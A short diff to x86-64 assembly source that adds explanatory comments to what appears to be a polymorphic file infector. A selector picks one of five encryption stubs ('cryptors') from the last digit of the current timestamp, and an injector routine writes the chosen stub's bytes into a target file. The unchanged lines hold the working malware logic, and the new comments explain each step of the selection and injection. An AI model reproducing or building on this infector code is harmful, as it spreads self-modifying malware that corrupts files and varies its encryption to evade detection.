@@ -97,7 +97,8 @@ _crypt5_end:
 ;; -------------------------------------------------------
 _injector:
 	enter	32, 0
-	
+
+	;; Save
 	mov		qword [rsp], rdi
 	mov		qword [rsp + 8], rsi
 
@@ -113,6 +114,7 @@ _injector_open:
 	mov		qword [rsp + 16], rax
 
 _injector_write:
+	;; Write into target file
 	mov		rax, 1
 	mov		rdi, qword [rsp + 16]
 	mov		rsi, qword [rsp]
@@ -120,6 +122,7 @@ _injector_write:
 	syscall
 
 _injector_close:
+	;; Close fd
 	mov		rax, SYS_CLOSE
 	mov		rdi, qword [rsp + 16]
 	syscall
@@ -139,14 +142,19 @@ _selector:
 	lea		rdi, [rsp]
 	mov		rsi, 0
 	syscall
+	
+	;; If it failed, get default encryptor
 	cmp		rax, -1
 	je		_selector_default
+
+	;; Get the last number of the timestamp
 	xor		rdx, rdx
 	mov		rax, qword [rsp]
 	mov		rcx, 10
 	div		rcx
 	mov		rax, rdx
 
+	;; If (number >= 1 && number <= totalNumberOfCryptors)
 	cmp		rax, 1
 	jl		_selector_default
 	cmp		rax, 5
@@ -154,19 +162,31 @@ _selector:
 	jmp		_selector_number
 
 _selector_default:
+	;; Get the first cryptor
 	lea		rdi, [rel _crypt]
+	
+	;; Get its size
 	lea		rsi, [rel _crypt_end + 2]
 	sub		rsi, rdi
+
+	;; Inject it into file
 	call	_injector
 	jmp		_selector_end
 
 _selector_number:
+	;; Get the size of the cryptor
 	lea		rdi, [rel _crypt]
 	lea		rsi, [rel _crypt_end + 2]
 	sub		rsi, rdi
 	mov		rcx, rsi
+	
+	;; Multiply the cryptor by the number of the cryptor selected
 	mul		rcx
+
+	;; Fetch the body of the cryptor located at this address
 	lea		rdi, [rel _crypt + rax]
+	
+	;; Inject it into file
 	call	_injector
 	jmp		_selector_end
 
